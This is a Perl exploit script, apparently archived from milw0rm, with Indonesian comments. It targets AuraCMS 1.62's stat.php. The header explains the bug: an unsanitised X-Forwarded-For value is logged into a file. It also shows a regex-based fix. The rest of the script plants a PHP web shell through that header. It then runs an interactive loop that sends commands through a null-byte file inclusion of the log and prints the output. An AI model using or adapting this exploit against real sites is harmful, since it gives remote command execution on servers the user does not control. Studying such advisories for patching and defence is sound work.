<html><head><title>AuraCMS 1.62 (stat.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 1.62 - (stat.php) Remote Code Execution Exploit
# Waktu			:  Jan 16 2008 10:00PM
# Software		:  AuraCMS 1.62  
#			   AuraCMS Mod Block Statistik | http://iwan.or.id/download/lihat/1/2-1-6.html
# Vendor		:  http://www.auracms.org/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Penjelasan		:
# 
# Kutu pada berkas &quot;stat.php&quot; didalam direktori /mod pada aplikasi web auracms 1.62
# ---//---
# 17. Function User_Online ($minutes, $NamaFile){
# 18. //$ip = $REMOTE_ADDR;
# 19. $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);
# 20. if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) == ''){
# 21. $ip = getenv(&quot;REMOTE_ADDR&quot;);	
# 22. }
# ---//---
# 47. fseek($f,0,SEEK_SET);
# 48. ftruncate($f,0);
# 49. array_pop($user);
# 50. foreach ($user as $line)
# 51.  	{
# 52. 	list($savedip,$savedtime) = split(&quot;\|&quot;,$line);
# 53. 	if ($savedip == $ip) {$savedtime = $time;$found = 1;}
# 54. 	if ($time &lt; $savedtime + ($minutes * 60)) 
# 55. 		{
# 56. 		fputs($f,&quot;$savedip|$savedtime\n&quot;);
# 57. 		$users = $users + 1;
# 58. 		}
# 59. 	}
# 60. 
# 61. if ($found == 0) 
# 62. 	{
# 63. 	fputs($f,&quot;$ip|$time\n&quot;);
# 64. 	$users = $users + 1;
# 65. 	}
# 66. 
# 67. fclose ($f);
# ---//---
#
# Sebagai Contoh;
# $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);
# $ip = &lt;?php phpinfo() ?&gt;  # &lt;-- user menginjeksi phpinfo
# format yang tersimpan
# &lt;?php phpinfo() ?&gt;|WAKTUBERKUNJUNG
#
# pada AuraCMS versi 1.62, log di simpan pada berkas /mod/online.db.txt [Default]
# 
# pada Mod Block Statistik, log disimpan pada berkas /logs/online.db.txt [Default]
#
# pada AuraCMS versi 2.x mod &quot;online&quot;, getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) bisa berakibat terjadinya &quot;SQL Injection&quot;
#
# =&gt; &quot;Perbaikan Kutu stat.php&quot;
# ---//---
# 19. $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);
# 20. if (preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', getenv(&quot;HTTP_X_FORWARDED_FOR&quot;)) == ''){
# 21. $ip = getenv(&quot;REMOTE_ADDR&quot;);
# 22. }
# ---//---
# 
# Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari,
# saya[k1tk4t] dan &quot;Indonesian Newhack Technology&quot; tidak bertanggung jawab akan kerusakan 
# yang diakibatkan dari penyalahgunaan exploit oleh pihak lain     
#
# =&gt;
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, y3dips, L41n, cyb3rh3b, K-159, the_hydra, NoGe
# nyubi, iFX, sin~X, k1n9k0ng, bius, selikoer, aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# ----------------------------[Mulai]------------------------------------
use IO::Socket;

if(!$ARGV[2])
{
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  |            Indonesian Newhack Technology              |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n  | AuraCMS 1.62 (stat.php) Remote Code Execution Exploit |&quot;;
 print &quot;\n  |                  Coded by k1tk4t                      |&quot;;
 print &quot;\n  |-------------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Penggunaan : perl auracms22.pl [Site] [Path] [Port]&quot;;
 print &quot;\n[!] Contoh     : perl auracms22.pl localhost /aura162/ 80&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n&quot;;
 exit;
}

$oriserver = $ARGV[0];
$orihost   = &quot;http://&quot;.$oriserver;
$oridir    = $ARGV[1];
$oriport   = $ARGV[2];

print &quot;- Melakukan Koneksi $orihost$oridir\r\n&quot;;
  
$injurl = &quot;index.php?pilih=stat&amp;mod=yes&quot;;
$injeksi = $oridir.$injurl;
$kodeterlarang = &quot;&lt;?php echo t4mugel4p;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}passthru(\$_GET[cmd]);die;?&gt;&quot;;
print &quot;- Sedang menginjeksi kode jahat\r\n&quot;;
$injkode =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$oriserver&quot;, PeerPort =&gt; &quot;$oriport&quot;) || die &quot;- Koneksi Gagal...\r\n&quot;;
print $injkode &quot;GET &quot;.$injeksi.&quot; HTTP/1.1\n&quot;;
print $injkode &quot;Host: &quot;.$oriserver.&quot;\r\n&quot;;
print $injkode &quot;X-Forwarded-For: &quot;.$kodeterlarang.&quot;\r\n&quot;;
print $injkode &quot;\r\n\r\n&quot;;
close ($injkode);

while($perintah !~ &quot;mati&quot;) 
{
$ekseurl = &quot;index.php?pilih=online.db.txt%00&amp;mod=yes&amp;cmd=&quot;.$perintah.&quot;&quot;;
$eksekusi = $oridir.$ekseurl;
print &quot;- Sedang mencoba menjalankan kode injeksi\r\n&quot;;
$eksekode =  IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$oriserver&quot;, PeerPort =&gt; &quot;$oriport&quot;) || die &quot;- Koneksi Gagal...\r\n&quot;;
print $eksekode &quot;GET &quot;.$eksekusi.&quot; HTTP/1.1\n&quot;;
print $eksekode &quot;Host: &quot;.$oriserver.&quot;\r\n&quot;;
print $eksekode &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11&quot;;
print $eksekode &quot;Accept: */*\r\n&quot;;
print $eksekode &quot;Connection: close\r\n\n&quot;;

while ($hasil = &lt;$eksekode&gt;)
	{ 
	print $hasil; 
	}
print &quot;[+]perintah =&gt; &quot;;
$perintah = &lt;STDIN&gt;;  
}

# milw0rm.com [2008-01-18]</pre></html>